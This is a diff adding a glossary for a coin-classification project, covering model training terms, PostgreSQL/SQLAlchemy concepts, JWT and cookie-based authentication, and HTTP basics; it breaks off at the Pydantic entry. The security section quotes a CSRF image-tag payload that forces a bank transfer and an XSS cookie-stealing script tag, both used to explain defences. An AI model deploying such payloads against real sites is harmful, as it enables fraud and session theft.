+A saved snapshot of the entire training state at one moment in time. Contains: model weights, optimizer state, scheduler position, AMP scaler state, and current epoch number. Loading a checkpoint and calling `train()` resumes training exactly where it stopped — like loading a saved video game.  
+We save `models/checkpoint_last.pth` after every epoch and `models/best_model.pth` whenever validation accuracy improves.
+
+---
+
+**CLAHE (Contrast Limited Adaptive Histogram Equalization)**  
+An image processing technique that makes dark details brighter without blowing out already-bright areas.  
+- **Standard histogram equalization**: adjusts contrast globally across the entire image. Brightening a dark coin can make the already-bright edges pure white (losing detail).  
+- **CLAHE**: divides the image into small tiles (8×8 grid) and adjusts contrast independently in each tile. The "contrast limited" part caps the maximum contrast in any tile to prevent noise amplification.  
+- **Why LAB color space**: LAB separates luminance (L channel, the "brightness") from color (A and B channels). We apply CLAHE only to the L channel. This enhances coin surface detail without distorting the archaeological color evidence (the green/brown patina that proves genuine aging).
+
+---
+
+**class_to_idx / idx_to_class**  
+Two Python dictionaries that convert between folder names (like `"3987"`) and integer indices (like `241`).  
+Neural networks only understand integers. Folder name `"3987"` is a CN type ID — the human-interpretable name. `class_to_idx["3987"] = 241` maps one to the other. `idx_to_class[241] = "3987"` maps back.  
+Saved in `models/class_mapping.pth`. WITHOUT this file, you can't interpret what the model predicted.
+
+---
+
+**CNN (Convolutional Neural Network)**  
+A neural network architecture designed specifically for images. It uses "convolutional filters" — small windows that slide across the image, detecting patterns at every location (edges, then color gradients, then textures, then object parts, eventually complete objects).  
+EfficientNet-B3 has 18 layers of convolutions, each one detecting more abstract patterns than the last. By the time an image reaches the classifier head, the 1536-dim vector represents all the visual features the model thinks matter.
+
+---
+
+**CosineAnnealingLR**  
+A learning rate schedule that changes the learning rate following the shape of a cosine curve — starts high, smoothly decreases to nearly zero over T_max epochs.  
+**Why cosine instead of constant?** Large lr early in training allows the model to explore broadly. Small lr late in training allows fine-grained convergence to a precise minimum. A sudden step decrease (like ReduceLROnPlateau) can destabilise training. A smooth cosine curve avoids this.
+
+---
+
+**CrossEntropyLoss**  
+The loss function for multi-class classification. For each training image, it looks at the probability the model assigned to the CORRECT class and computes `-log(that_probability)`. If the model is 99% confident and correct: loss = -log(0.99) ≈ 0.01. If the model is 1% confident for the correct class: loss = -log(0.01) ≈ 4.6. The model is punished hard for missed predictions.  
+With `label_smoothing=0.1`: instead of training toward 100% confidence on one class, train toward 90% on the correct class and 0.023% on each other class. Prevents overconfident predictions.
+
+---
+
+**CUDA**  
+NVIDIA's parallel computing platform. Translates PyTorch's tensor operations into GPU instructions. Without CUDA, training would run on the CPU — ~50-100× slower. With CUDA on the RTX 3050 Ti, each epoch takes ~3.3 minutes instead of ~5 hours.
+
+---
+
+**DataLoader**  
+PyTorch's "conveyor belt" for feeding data to the model. Takes a Dataset and:
+1. Shuffles the sample order each epoch (training DataLoader only)
+2. Divides samples into batches of `batch_size`
+3. Uses multiple CPU threads (`num_workers=4`) to pre-load the next batch while the GPU trains on the current one
+4. Transfers batches to GPU memory  
+Without DataLoader, you'd write all this bookkeeping manually.
+
+---
+
+**Dataset (PyTorch)**  
+A Python class that PyTorch knows how to use. Must have two methods:
+- `__len__()`: how many total samples?
+- `__getitem__(idx)`: give me sample number `idx` (loads from disk, applies transforms, returns `(tensor, label)`)  
+Our `DeepCoinDataset` inherits from `torch.utils.data.Dataset`.
+
+---
+
+**Dropout**  
+A regularization technique. During training, randomly set a fraction (0.4 = 40%) of neuron outputs to zero before they feed into the next layer. The neurons that are "dropped out" change randomly every batch.  
+**Why it works**: The model can't rely on any single neuron's output — it gets dropped 40% of the time. The model is forced to build redundant representations of every feature. At inference time, Dropout is disabled and all neurons contribute.
+
+---
+
+**Early Stopping**  
+If validation accuracy hasn't improved for `patience` consecutive epochs, stop training.  
+We use `patience=10`: if epochs 53 through 62 all have worse validation accuracy than epoch 52, training stops at epoch 62. The `best_model.pth` from epoch 52 is the official model.  
+Why not just train to 100 epochs? After the best epoch, the model starts overfitting — getting better on training data but worse on validation data. Continuing to train would make the final model worse.
+
+---
+
+**EfficientNet**  
+A family of CNN models (B0 through B7) designed by Google Brain. The key innovation is "compound scaling": instead of making the network bigger by adding only more layers (depth) or only wider (width) or only higher resolution (input size), EfficientNet scales all three dimensions together in a mathematically optimal ratio.  
+We use B3 because it achieves the best trade-off between accuracy and parameter count for our hardware (4.3 GB VRAM). B7 would need ~8 GB VRAM.
+
+---
+
+**Epoch**  
+One complete pass through the entire training dataset. In our training: 1 epoch = 5,373 training images seen = 336 weight updates (5373 / 16 images-per-batch).  
+We train for up to 100 epochs but stop early when improvement plateaus. Our best model was found at epoch 52.
+
+---
+
+**F1-Score**  
+A metric that balances precision and recall into a single number.  
+`F1 = 2 × (Precision × Recall) / (Precision + Recall)`  
+F1 = 1.0 is perfect. F1 = 0.0 means the model gets nothing right.  
+We compute macro F1: average F1 across all 438 classes, giving equal weight to rare and common classes. Result: 0.7763.
+
+---
+
+**Feature Extractor**  
+The part of EfficientNet-B3 BEFORE the final classification layer. It transforms a 299×299×3 input into a 1536-dimensional vector. This vector is the coin's "fingerprint" — a compressed representation of everything the model learned about the coin's visual characteristics. Two visually similar coins will have similar 1536-dim vectors (close in vector space). Two completely different coins will have distant vectors.
+
+---
+
+**Fine-tuning**  
+Starting with a model pre-trained on one task (ImageNet: 1000 categories of everyday objects) and continuing training on your own task (438 ancient coin types).  
+The pre-trained model has already learned how to detect edges, textures, shapes, and color patterns in images — skills that transfer directly to coin analysis. You only need to teach it the NEW classification task, not how to perceive images from scratch. This is why fine-tuning with 7,677 images achieves 80% accuracy while training from scratch might achieve 40%.
+
+---
+
+**float16 / float32**  
+Number formats used inside neural networks.  
+- `float32`: 32 bits (4 bytes) per number. Can represent values from ~1.2×10⁻³⁸ to ~3.4×10³⁸ with 7 significant decimal digits.  
+- `float16`: 16 bits (2 bytes) per number. Can represent values from ~6.1×10⁻⁵ to ~65,504 with ~3.3 significant decimal digits.  
+AMP uses float16 for the forward pass (faster, less memory) and float32 for optimizer states (more precision for stable convergence).
+
+---
+
+**GradScaler**  
+The safety mechanism for AMP training. It multiplies the loss by a large factor (e.g., 65536) before the backward pass (scaling UP gradients so they don't disappear in float16 land), then divides by the same factor before the optimizer step (scaling DOWN so the actual updates are correct).  
+If a gradient step produces `inf` or `nan` (an overflow), the GradScaler skips that batch entirely and reduces the scale factor. It automatically finds the largest safe scale.
+
+---
+
+**Gradient**  
+A direction and magnitude computed by backpropagation. For each of the model's ~12 million weights, the gradient says: "if you increase this weight by ε, the loss changes by this_gradient × ε." The optimizer uses the gradient to nudge weights in the direction that reduces the loss.
+
+---
+
+**Gradient Clipping**  
+Before applying gradient updates, cap the magnitude of the gradient vector to a maximum value. `max_norm=1.0` means: if the gradient vector has length > 1.0, scale it down so its length is exactly 1.0.  
+Prevents "exploding gradients" — a pathological case where one bad batch produces enormous gradient values that corrupt the model. Common with recurrent networks; less common with EfficientNet but still a good safety measure.
+
+---
+
+**hotspot (confusion hotspot)**  
+A pair of classes the model confuses far more often than chance would predict. Our worst hotspot: class 3314 predicted as class 3987 ten times more often than expected. This tells us those two coin types are visually very similar and may represent the same mint's output in different eras.
+
+---
+
+**ImageNet**  
+A dataset of 1.28 million images across 1,000 categories. Used to pre-train EfficientNet-B3 for transfer learning. The key values we care about: ImageNet's mean = [0.485, 0.456, 0.406] per RGB channel, standard deviation = [0.229, 0.224, 0.225]. These are used for normalization.
+
+---
+
+**Label Smoothing**  
+Parameter `label_smoothing=0.1`. Instead of training the model toward 100% confidence on one class, train it toward 90% on the correct class and 0.023% on each of the other 437 classes.  
+Why? Raw training labels are sometimes ambiguous — two visually similar coin types may both be plausible. Training toward 100% confidence forces the model to be more certain than the data justifies, and increases overfitting.
+
+---
+
+**Lazy Loading**  
+Load data only exactly when needed. Our `DeepCoinDataset` stores `(file_path, label)` tuples — not pixel arrays.  
+If we loaded all 7,677 images upfront: 7677 × 299 × 299 × 3 × 1 byte = 2.06 GB RAM just for images. Plus model + gradients = out of RAM.  
+With lazy loading: only the current batch (16 images = 4.3 MB) is in memory at any time.
+
+---
+
+**Learning Rate (lr)**  
+How far to step in the gradient direction on each update. `lr=1e-4 = 0.0001`.  
+- Too large: the model oscillates around the minimum but never converges.  
+- Too small: training works but takes ~10× longer.  
+- 1e-4 is the empirically validated sweet spot for fine-tuning pretrained vision models with AdamW.
+
+---
+
+**Long-tail Distribution**  
+A dataset where a few classes have many examples (the "head") and many classes have very few examples (the "tail"). When you plot classes sorted by frequency, the shape looks like a tall head and a long thin tail.  
+Our raw dataset: class 3987 has 204 images (head). Class 5181 has 5 images (tail). The 40:1 imbalance ratio is the tail.
+
+---
+
+**Mixup**  
+A training technique that blends two training images and their labels: `mixed_image = λ × imgA + (1-λ) × imgB`, where `λ ~ Beta(0.2, 0.2)`.  
+**Why it works**: standard training learns very sharp decision boundaries ("100% this side is class A, 100% that side is class B"). Mixup forces the model to interpolate predictions for mixed images, which smooths decision boundaries, improves generalisation, and reduces the train/val accuracy gap by 3-5%.
+
+---
+
+**model.eval() vs model.train()**  
+PyTorch models have two modes.  
+- `model.train()`: Dropout is ON (randomly zero 40% of neurons). BatchNorm uses running statistics from the current batch.  
+- `model.eval()`: Dropout is OFF (all neurons active). BatchNorm uses fixed statistics from training.  
+Always call `model.eval()` before inference. Forgetting it introduces randomness — the same image produces different predictions each time.
+
+---
+
+**Normalization**  
+Transforms pixel values from [0, 255] to a range the pre-trained model expects. Formula: `(pixel / 255 - mean) / std`.  
+Using ImageNet statistics (mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]):
+- A pixel value of 255 (maximum white) → ~(1.0 - 0.485) / 0.229 ≈ 2.25
+- A pixel value of 0 (black) → ~(0.0 - 0.485) / 0.229 ≈ -2.12  
+The model's convolutional filters were calibrated to this exact distribution during ImageNet pre-training. Wrong normalization = wrong activation pattern = 15-20% accuracy drop.
+
+---
+
+**Overfitting**  
+The model performs well on training data but poorly on unseen data.  
+Training accuracy 99%, validation accuracy 80% = 19% overfitting gap.  
+Analogy: a student who memorises the textbook word-for-word. If the exam asks the exact textbook questions, they ace it. Slightly rephrased question: they have no idea.  
+We fight overfitting with: Dropout, Mixup, Label Smoothing, Weight Decay, Data Augmentation.
+
+---
+
+**Padding (image padding)**  
+Adding black pixels to the shorter edge of an image after scaling to reach the target 299×299 size.  
+If the original coin photo is 400×300 (wider than tall), we scale to 299×224 (maintaining aspect ratio), then add 38 black pixels to both top and bottom to reach 299×299. No stretching. The coin's circular geometry is preserved.
+
+---
+
+**pin_memory**  
+A CUDA optimization. When `pin_memory=True`, the DataLoader allocates batch tensors in "pinned" (page-locked) RAM. The GPU can access pinned memory directly via DMA (Direct Memory Access) without copying — ~30% faster batch transfers. Enabled only for the training DataLoader.
+
+---
+
+**Precision**  
+Of all the times the model said "this is class X," what fraction were actually class X?  
+High precision means: when the model declares a coin to be type 1015, it is usually right.  
+`precision = true_positives / (true_positives + false_positives)`
+
+---
+
+**Recall**  
+Of all the actual class X images, what fraction did the model correctly identify?  
+High recall means: the model finds most of the actual type 1015 coins.  
+`recall = true_positives / (true_positives + false_negatives)`
+
+---
+
+**Softmax**  
+A function that converts raw model output (logits — arbitrary positive and negative numbers) to probabilities that sum to exactly 1.0.  
+`softmax([2.3, -0.4, 1.7]) → [0.72, 0.05, 0.23]`  
+The highest softmax output = the model's "most confident" class. That confidence value is what we use for routing (>85%, 40-85%, <40%).
+
+---
+
+**Stratified Split**  
+Dividing the dataset into train/val/test while ensuring each class is proportionally represented in all three splits.  
+Without stratification: random chance might put all 5 images of class 5181 into the training set, leaving zero for validation. The model never gets evaluated on that class.  
+With stratification (seed=42): every class has roughly 70% in train, 15% in val, 15% in test.
+
+---
+
+**Subset**  
+A PyTorch wrapper that creates a view of a Dataset using a specific list of indices. `Subset(full_dataset, [0, 1, 5, 10])` looks like a 4-sample dataset without copying any data.  
+After stratified splitting, we have three Subsets: train_subset, val_subset, test_subset — all pointing to the same underlying `DeepCoinDataset`.
+
+---
+
+**Temperature Scaling**  
+Post-hoc calibration of softmax outputs. Divides logits by a scalar T before softmax. T>1 makes predictions less confident (spreads probability mass more evenly). T<1 makes them more confident.  
+The optimal T minimises Negative Log-Likelihood on the validation set. Applied in inference to make confidence scores better calibrated (reported 91% should actually be correct ~91% of the time).
+
+---
+
+**Tensor Cores**  
+Dedicated hardware units inside modern NVIDIA GPUs (RTX 20xx and later) that perform float16 matrix multiplications extremely fast. The RTX 3050 Ti has 80 Tensor Cores. AMP training specifically targets these units, which is why float16 is 2-4× faster on Tensor Cores than float32.
+
+---
+
+**TTA (Test-Time Augmentation)**  
+Running inference 8 times on augmented versions of the same image and averaging the softmax probability distributions.  
+The 8 passes: original, horizontal flip, vertical flip, both flips, 4 corner crops at 85%.  
+Why it helps: the model is slightly sensitive to exact orientation and centering. Averaging 8 predictions cancels out this noise. Result: +0.78% accuracy at zero training cost.
+
+---
+
+**Transfer Learning**  
+Using a model pre-trained on task A as a starting point for task B.  
+ImageNet (task A) has 1.2M photos of dogs, chairs, cars, etc. A model trained on it learns to detect edges, textures, shapes, and compositions — general visual skills. Fine-tuning it on ancient coins (task B) reuses those visual skills and only needs to learn the new classification task.  
+Without transfer learning, 7,677 coin images wouldn't be enough to train from scratch. With it, 80% accuracy is achievable.
+
+---
+
+**Validation Set**  
+15% of the data held out from training. After each epoch, we evaluate on the validation set to answer: "Is this model better than the last epoch's model?" We never update model weights based on validation data. The validation set is used ONLY for measuring progress and deciding when to stop training.
+
+---
+
+**VRAM (Video RAM)**  
+Memory on the GPU. RTX 3050 Ti has 4,294 MB (4.3 GB). Stores: model weights (~47 MB), gradients (~47 MB), optimizer states (~94 MB for AdamW), current batch (~4 MB), intermediate activations (~several hundred MB). Total peak usage ~3.8 GB with batch_size=16.
+
+---
+
+**WeightedRandomSampler**  
+A DataLoader sampler that compensates for class imbalance. Each training sample gets a weight = `1 / class_count` where class_count is how many training images that class has. Class 3987 (204 images) gets weight ≈ 0.005. Class 5181 (5 images) gets weight = 0.2. The sampler draws each sample proportionally to its weight — rare classes are seen many more times per epoch.  
+Without it: the model would optimise almost entirely for common classes and essentially ignore rare ones.
+
+---
+
+**`torch.no_grad()`**  
+A Python context manager. Inside it, PyTorch does NOT track gradient computation graphs. Since inference never calls `.backward()`, gradient tracking is pure overhead (~50% extra memory, ~30% extra time). Always use `with torch.no_grad():` during inference.
+
+---
+
+**weight_decay**  
+An L2 regularisation parameter in AdamW. After computing the gradient update for a weight, ALSO subtract a small fraction (`weight_decay × current_weight_value`) from the weight. This gently pulls all weights toward zero throughout training, preventing any single weight from growing very large to fit a specific training pattern.
+
+---
+
+### Part 2 — Database and ORM
+
+---
+
+**Alembic**  
+A database migration tool for SQLAlchemy. It maintains a version history of your database schema. Like git, but for your database structure.  
+Every time the schema changes (add a column, create a table), you create a migration script. Alembic can "upgrade" (apply the change) or "downgrade" (reverse it).  
+Commands:
+- `alembic upgrade head` — apply all pending migrations
+- `alembic downgrade -1` — reverse the last migration
+- `alembic history` — list all migrations and their status
+
+---
+
+**ACID (Atomicity, Consistency, Isolation, Durability)**  
+The four properties guaranteed by PostgreSQL (and most relational databases) for every transaction.  
+- **Atomicity**: all operations in a transaction succeed together, or none of them do. No partial updates.  
+- **Consistency**: every transaction takes the database from one valid state to another valid state.  
+- **Isolation**: concurrent transactions don't interfere with each other.  
+- **Durability**: once committed, the data survives crashes, power failures, etc.  
+SQLite has these properties too, but PostgreSQL handles concurrent writes from 100+ connections without locking the entire database.
+
+---
+
+**AsyncSession**  
+An asynchronous database session from SQLAlchemy 2. Allows `await session.execute()` inside the FastAPI async event loop without blocking other requests.  
+Using regular (synchronous) `session.execute()` inside FastAPI would block the entire server during every database query — other requests would have to wait.
+
+---
+
+**asyncpg**  
+A very fast Python driver for PostgreSQL that works natively with Python's `asyncio` (the async/await system). Used via the `postgresql+asyncpg://` URL prefix in SQLAlchemy's `create_async_engine()`.
+
+---
+
+**Connection Pool**  
+A set of pre-opened database connections kept ready for use. Opening a new connection to PostgreSQL takes ~50-200ms (TCP handshake + authentication + session setup). With a connection pool of 5, the first 5 requests each find an open, ready connection immediately.  
+Pool settings:
+- `pool_size=5` — keep 5 connections open permanently
+- `max_overflow=10` — allow 10 additional temporary connections during traffic spikes
+- `pool_pre_ping=True` — test each connection with `SELECT 1` before use (detects stale connections from DB restarts)
+
+---
+
+**DeclarativeBase**  
+A SQLAlchemy class that all ORM model classes inherit from. It provides the mapping infrastructure: when you write `class User(Base):`, SQLAlchemy knows this Python class represents a database table and should be managed by the ORM.
+
+---
+
+**DDL (Data Definition Language)**  
+The subset of SQL that defines the structure of tables, columns, and constraints.  
+```sql
+CREATE TABLE users ( ... )    -- DDL
+ALTER TABLE users ADD COLUMN  -- DDL
+DROP TABLE users              -- DDL
+SELECT * FROM users           -- NOT DDL (this is DML — Data Manipulation Language)
+```
+
+---
+
+**`expire_on_commit=False`**  
+A SQLAlchemy session option. By default, after `session.commit()`, all ORM objects in the session are "expired" — accessing any attribute triggers a new SELECT query to reload from the database.  
+In async FastAPI, the database session closes after the route handler returns. If FastAPI then tries to serialize the User object returned by the handler (which is now expired), it would try to access the closed session and crash.  
+`expire_on_commit=False` keeps the object's attributes in memory after commit. No extra query needed.
+
+---
+
+**Foreign Key**  
+A column that references the primary key of another table. `classifications.user_id` is a foreign key pointing to `users.id`. This is the database's way of enforcing "a classification must belong to an existing user."  
+`ondelete="SET NULL"` — if the referenced user is deleted, set `user_id` to NULL instead of deleting the classification (preserve research data).  
+`ondelete="CASCADE"` — if the referenced classification is deleted, automatically delete all its feedback rows too.
+
+---
+
+**JSONB**  
+PostgreSQL's binary JSON column type. Stores arbitrary JSON data in a compressed binary format that:
+- Can be queried with JSON operators: `payload->>'confidence'`
+- Can be indexed so queries on specific JSON keys are fast
+- Takes ~less storage than plain TEXT JSON  
+We use JSONB for `classifications.payload` — the full `ClassifyResponse` JSON blob. When the schema of `ClassifyResponse` gains new fields, we don't need a database migration. The new fields are just stored as additional JSON keys in the existing column.
+
+---
+
+**Migration**  
+A versioned, reversible change to a database schema. In Alembic, a migration is a Python file with:
+- `upgrade()` function — applies the change (e.g., `op.create_table(...)`)  
+- `downgrade()` function — reverses the change (e.g., `op.drop_table(...)`)  
+The revision chain: `"base" → 001_initial_schema → 002_add_column → ...`
+
+---
+
+**NullPool**  
+A SQLAlchemy connection pool that creates a new connection for every operation and closes it immediately after. No connections are kept open between operations.  
+Why Alembic uses NullPool: Alembic migrations run as one-shot scripts. The regular async pool creates connections that require an active event loop. When Alembic calls `run_sync()` (running sync migration code on an async connection), the regular pool's connection lifecycle doesn't fit. NullPool avoids this mismatch.
+
+---
+
+**ORM (Object-Relational Mapper)**  
+A tool that lets you interact with a relational database using Python objects and classes instead of writing SQL strings.  
+Without ORM:
+```python
+cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
+row = cursor.fetchone()
+user = {"id": row[0], "email": row[1], ...}  # manual mapping
+```
+With SQLAlchemy ORM:
+```python
+user = await session.get(User, user_id)  # Python object, all columns as attributes
+```
+The ORM translates your Python operations into SQL, handles type conversion, and manages the connection lifecycle.
+
+---
+
+**Primary Key (PK)**  
+A column (or columns) that uniquely identifies each row in a table. Every table must have one. We use UUID primary keys (`gen_random_uuid()`).  
+Why UUID instead of sequential integers (1, 2, 3...)?  
+- Sequential integers reveal record counts: `user_id=5` tells an attacker "there are at most 5 users." UUID (`550e8400-e29b-41d4-a716-446655440000`) reveals nothing.
+- UUIDs can be generated on the client before inserting (useful for distributed systems).
+- No contention: multiple servers can generate PKs simultaneously with zero collision risk.
+
+---
+
+**PostgreSQL**  
+The full-featured relational database used in production. Compared to SQLite:  
+- Handles concurrent writes from hundreds of simultaneous connections
+- Supports complex queries (window functions, CTEs, JSON operators)
+- Has row-level locking instead of file-level locking
+- Network protocol (any server can connect, not just the local process)
+- ACID-compliant with write-ahead logging (WAL)  
+PostgreSQL Runs as a separate process (or Docker container) that the FastAPI application connects to over the network.
+
+---
+
+**`run_sync`**  
+An async SQLAlchemy method that runs a synchronous function inside an async connection. Alembic's migration commands (`op.create_table()`, etc.) are synchronous. Our SQLAlchemy engine is async. `conn.run_sync(do_run_migrations)` bridges the two worlds by executing the sync migration function in a way the async engine can understand.
+
+---
+
+**SQLite**  
+A lightweight embedded relational database that stores everything in a single file. No separate server process. Perfect for development, testing, and single-user tools.  
+Used for: `src/api/_store.py` (classification history store) — this is planned to be replaced by PostgreSQL in Phase A4.  
+WAL mode (`PRAGMA journal_mode=WAL`): writes go to a separate write-ahead log first, enabling concurrent readers. Without WAL, every write locks the entire database file.
+
+---
+
+**TIMESTAMPTZ (Timestamp with Time Zone)**  
+A PostgreSQL column type that stores a moment in time in UTC and automatically converts to/from the client's timezone.  
+We use TIMESTAMPTZ everywhere instead of plain TIMESTAMP to avoid the "daylight saving time bug" — if you store local time and clocks change, old timestamps become ambiguous. UTC is unambiguous: it never changes.
+
+---
+
+**UUID (Universally Unique Identifier)**  
+A 128-bit identifier generated randomly. Formatted as `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`. For primary keys, we use `gen_random_uuid()` which is a built-in PostgreSQL function. The probability of two UUIDs colliding is 1 in 5.3×10³⁶ — effectively zero.
+
+---
+
+### Part 3 — Authentication and Security
+
+---
+
+**Access Token**  
+A short-lived JWT (15 minutes). Sent as a `Bearer` token in the `Authorization` HTTP header with every authenticated request. When it expires, the frontend uses the refresh token to get a new one.  
+Why short-lived? If someone steals your access token, it's only valid for 15 minutes. They can't keep using it indefinitely.
+
+---
+
+**bcrypt**  
+A password hashing algorithm specifically designed to be slow. "Slow" is intentional — it makes brute-force attacks impractical.  
+- Work factor 12 means the hash computation is performed 2¹² = 4,096 times. One hash takes ~250ms on our CPU.  
+- An attacker with modern hardware can compute ~100,000 bcrypt-12 hashes per second. Testing 8 random characters (lowercase only) would take ~2.8 years. Adding uppercase + numbers = thousands of years.  
+- bcrypt also automatically generates and embeds a random "salt" (16 random bytes): `$2b$12$[22-char-salt][31-char-hash]`. Even if two users have the same password, their bcrypt hashes are different (different salt).
+
+---
+
+**Bearer Token**  
+An HTTP authentication scheme. The client includes the token in the `Authorization` header: `Authorization: Bearer <token>`. The server verifies the token and extracts the user identity.  
+"Bearer" means "whoever has this token is authorized." Unlike cookie-based auth, there is no session state on the server — the token itself contains all necessary information.
+
+---
+
+**CORS (Cross-Origin Resource Sharing)**  
+A browser security feature that blocks JavaScript from making HTTP requests to a different domain than the one that served the web page.  
+Without CORS configuration, `https://deepcoin.app` (frontend) cannot call `https://api.deepcoin.app` (backend) — the browser blocks it.  
+With `CORSMiddleware(allow_origins=["http://localhost:3000"])`, the server sends `Access-Control-Allow-Origin` headers that tell the browser "this cross-origin request is allowed."
+
+---
+
+**CSRF (Cross-Site Request Forgery)**  
+An attack where a malicious website tricks your browser into making authenticated requests to another site.  
+Example: you're logged into your bank. You visit `evil.com`. It has hidden `<img src="https://your-bank.com/transfer?to=attacker&amount=9999">`. Your browser sends the request WITH your bank's cookie — the bank thinks it's you.  
+Protection: `SameSite=Lax` on our refresh token cookie means the browser ONLY sends the cookie on same-origin requests or top-level navigation, not on cross-origin sub-resource requests.
+
+---
+
+**Cookie (httpOnly)**  
+A piece of data the server asks the browser to store and automatically include in future requests to the same domain.  
+`httpOnly=True`: JavaScript cannot read this cookie. Even if an XSS attack injects malicious JS into the page, it cannot steal the refresh token from an httpOnly cookie.  
+`Secure=True`: the browser only sends this cookie over HTTPS connections.  
+`SameSite=Lax`: the cookie is not sent for cross-origin requests (CSRF protection).
+
+---
+
+**Dependency Injection (FastAPI)**  
+A pattern where route handler functions declare "I need this thing" and FastAPI automatically provides it.  
+```python
+async def get_user(token = Depends(oauth2_scheme), db = Depends(get_db)):
+    # token came from the Authorization header
+    # db is an AsyncSession, auto-committed/rolled back after the handler
+```
+FastAPI sees `Depends(get_db)` and calls `get_db()` before calling the route handler. When the handler finishes, FastAPI resumes `get_db()` after the `yield` (committing or rolling back).  
+This eliminates boilerplate: every route that needs auth doesn't have to re-implement "read header, verify JWT, look up user in DB."
+
+---
+
+**HMAC (Hash-based Message Authentication Code)**  
+A way to verify data integrity using a secret key. `hmac.compare_digest(a, b)` compares two strings in constant time — it always takes the same number of operations regardless of where the strings differ.  
+Why constant time matters: `a == b` in Python stops comparing at the first different character. This creates a "timing oracle" — an attacker sends thousands of guesses and measures response time. Longer response time = more characters matched = they found the beginning of the secret. `hmac.compare_digest` prevents this.
+
+---
+
+**HSTS (HTTP Strict Transport Security)**  
+A response header that tells browsers "never try HTTP for this domain, always use HTTPS."  
+`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`  
+- `max-age=63072000` — remember this for 2 years
+- `includeSubDomains` — applies to all subdomains too
+- `preload` — submit to browser preload lists (browsers will use HTTPS even before the first visit)
+
+---
+
+**JWT (JSON Web Token)**  
+A self-contained authentication token. Three parts separated by dots: `header.payload.signature`  
+```
+header:   {"alg": "HS256", "typ": "JWT"}  → base64url → eyJhbGci...
+payload:  {"sub": "user-uuid", "exp": 1740000000, "type": "access"}  → base64url → eyJzdWIi...
+signature: HMAC-SHA256(header + "." + payload, JWT_SECRET)  → base64url → SflKxwRJ...
+```
+**Self-contained**: the server doesn't need to look up "is this token valid?" in a database. It re-computes the HMAC and checks if the signatures match. If they match, the payload is authentic and unmodified.  
+**Stateless**: no session table needed.  
+**`exp` claim**: Unix timestamp of when the token expires. The server rejects any token where `now > exp`.
+
+---
+
+**OAuth2**  
+An authorization framework. `OAuth2PasswordBearer` in FastAPI is NOT full OAuth2 with third-party providers (Google, GitHub). It's just using OAuth2's `Bearer` token pattern — the client sends credentials, gets a Bearer token back, uses that token in `Authorization: Bearer <token>` headers.
+
+---
+
+**Password Reset Flow**  
+1. User submits email via `POST /auth/forgot-password`
+2. Server ALWAYS returns 200 (even if email doesn't exist) — this is intentional. If we returned 404 for unknown emails, an attacker could use this to enumerate which emails have accounts.
+3. If the email exists: create `EmailVerification(token_type="reset")` with 1-hour expiry, send the link
+4. User clicks the link: `POST /auth/reset-password` with the token + new password
+5. Server verifies the token hasn't been used, applies bcrypt hash, revokes ALL user's refresh tokens (forces re-login on all devices)
+
+---
+
+**RBAC (Role-Based Access Control)**  
+Users have roles. Routes require specific roles. Users without the required role get 403 Forbidden.  
+Our roles: `admin`, `curator`, `analyst`  
+Examples:
+- `GET /auth/me` — any authenticated user
+- `DELETE /api/history/{id}` — user can delete their own, admin can delete any
+- `GET /api/metrics` — admin only  
+Implemented via the `require_role(*roles)` dependency factory.
+
+---
+
+**Refresh Token**  
+A long-lived token (7 days) stored as an httpOnly cookie. Used ONLY for getting new access tokens. Never included in API calls.  
+**Token rotation**: every time you use a refresh token, it is replaced with a new one. The old token is immediately revoked. If an attacker steals an old refresh token and tries to use it after the legitimate user has already rotated it, the server detects this (the old token is in the "already used" state) and revokes ALL of the user's active sessions as a security measure.
+
+---
+
+**Salt (cryptography)**  
+A random value added to a password before hashing. Stored alongside the hash.  
+Without salt: all users with the same password have the same hash. An attacker with a pre-computed table of common password hashes ("rainbow table") can immediately look up any hash and find the password.  
+With salt: even two users with the password "cat123" have different hashes (because different salts were used). The rainbow table is useless.  
+bcrypt automatically generates and embeds a 16-byte random salt. You never handle it manually.
+
+---
+
+**Session Token vs JWT**  
+- **Session token**: a random string stored in the server's memory/database. Server looks it up on every request. Stateful.  
+- **JWT**: a self-verifying token. Server verifies the signature using the secret key. No database lookup needed. Stateless.  
+We use JWTs for access tokens (stateless = fast, no DB round-trip) and store refresh tokens in the database (so we can revoke them — JWTs can't be revoked, but a database entry can be deleted).
+
+---
+
+**XSS (Cross-Site Scripting)**  
+An attack where malicious JavaScript is injected into a web page, then executed in other users' browsers.  
+Example: user submits a comment containing `<script>steal_cookies()</script>`. If the site doesn't sanitise input and just displays it, every visitor who sees the comment runs the script.  
+Our mitigations:
+- `httpOnly` cookies (JS can't steal them)
+- Content Security Policy (restricts which scripts can run)
+- React's JSX automatically escapes all inserted content (no raw HTML injection)
+
+---
+
+### Part 4 — Web APIs and HTTP
+
+---
+
+**ASGI (Asynchronous Server Gateway Interface)**  
+A Python standard for async web frameworks. Like WSGI but for `async/await`. FastAPI is an ASGI framework. Uvicorn is an ASGI server. Uvicorn runs FastAPI by implementing the ASGI protocol.
+
+---
+
+**FastAPI**  
+A modern Python web framework for building APIs. Key features:
+- `async`/`await` native — handles many concurrent requests without threads
+- Auto-generates OpenAPI documentation (Swagger UI at `/docs`)
+- Pydantic integration — request/response models are validated automatically
+- Dependency injection system  
+Every route is a Python function decorated with `@app.get(...)` or `@app.post(...)`.
+
+---
+
+**HTTP Status Codes**  
+Standardised 3-digit numbers in every HTTP response.  
+| Code | Meaning | When we return it |
+|------|---------|------|
+| 200 | OK | Successful GET/POST |
+| 201 | Created | User registered, resource created |
+| 204 | No Content | Successful DELETE |
+| 400 | Bad Request | Invalid input (wrong file type) |
+| 401 | Unauthorized | Invalid/expired/missing token |
+| 403 | Forbidden | Token valid but wrong role |
+| 404 | Not Found | Record with that ID doesn't exist |
+| 422 | Unprocessable Entity | Pydantic validation failed |
+| 429 | Too Many Requests | Rate limit exceeded |
+| 500 | Internal Server Error | Unhandled exception in our code |
+| 503 | Service Unavailable | `/api/health` reports degraded components |
+
+---
+
+**Middleware**  
+Code that runs on EVERY request and response, regardless of which route handler is called. Like a security checkpoint that every visitor must pass through.  
+Our middleware stack (runs in order):
+1. `GZipMiddleware` — compress responses ≥ 500 bytes
+2. `X-Request-ID middleware` — assign UUID to request, echo in response header
+3. `CORSMiddleware` — add CORS headers
+4. `SlowAPI limiter` — check rate limits  
+The route handler only runs AFTER all middleware passes.
+
+---
+
+**Pydantic**  
